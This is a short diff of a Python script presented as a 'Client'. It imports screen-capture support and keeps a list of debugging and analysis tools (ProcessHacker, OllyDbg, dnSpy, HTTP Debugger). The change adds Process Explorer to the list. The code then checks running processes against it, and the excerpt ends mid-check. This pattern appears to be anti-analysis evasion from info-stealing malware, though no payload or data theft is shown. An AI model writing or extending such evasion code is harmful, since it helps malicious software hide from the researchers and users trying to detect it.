@@ -5,7 +5,7 @@ import re, uuid
 from pystyle import *
 from PIL import ImageGrab
 os.system('cls')
-print("Loading Client.................")
+print("Loading Client..")
 process = [
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
@@ -20,7 +20,9 @@ process = [
     "ollydbg.exe",
     "dnspy64.exe",
     "dnspy32.exe",
-    "dnspy.exe"
+    "dnspy.exe",
+    "procexp64.exe",
+    "procexp.exe"
 ]
 for proc in psutil.process_iter():
     if proc.name() in process:
